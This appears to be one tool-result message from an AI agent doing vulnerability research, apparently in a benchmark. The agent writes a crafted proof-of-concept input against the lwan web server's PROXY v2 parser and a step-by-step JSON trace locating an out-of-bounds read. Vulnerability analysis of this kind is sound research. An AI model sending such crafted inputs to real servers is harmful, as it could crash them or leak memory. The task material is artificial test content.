message:
Command `python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc2.bin')
# Exact 16-byte signature + len=0xFFFF, no payload
p.write_bytes(b'\r\n\r\n\x00\r\nQUIT\n'+bytes([0x21,0x11])+ (0xFFFF).to_bytes(2,'big'))
print('wrote',p, p.stat().st_size)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1634,"var":"helper.buffer","code":".buffer = &(struct lwan_value){.value = data_copy, .len = length},","note":"The harness copies the attacker input into a fixed buffer and exposes it as the request buffer for parsing."},
  {"step":2,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_http_request","line":1169,"var":"buffer","code":"buffer = parse_proxy_protocol(request, buffer);","note":"Because REQUEST_ALLOW_PROXY_REQS is set in the harness, the first bytes of the input are interpreted as an optional proxy header."},
  {"step":3,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1153,"var":"buffer","code":"case MULTICHAR_CONSTANT('\x0D','\x0A','\x0D','\x0A'): return parse_proxy_protocol_v2(request, buffer);","note":"The crafted prefix matches the PROXY v2 signature and dispatches to the v2 parser."},
  {"step":4,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":225,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The parser treats the attacker bytes as a structured proxy header and then reads the length field from that structure."},
  {"step":5,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len);","note":"An attacker-controlled 16-bit length expands the number of bytes the parser believes belong to the proxy header."},
  {"step":6,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":234,"var":"size check","code":"if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"The only guard compares the claimed record size against the struct size instead of the actual buffered length, so malformed inputs with a crafted length field can still proceed far enough to dereference fields outside the available input span."},
  {"step":7,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":236,"var":"hdr->addr.ip4.src_addr","code":"from->sin_addr.s_addr = hdr->addr.ip4.src_addr;","note":"The parser then consumes address/port fields from the proxy header, which is the out-of-bounds memory access sink for this candidate."}
]
JSON` executed with exit code 0.
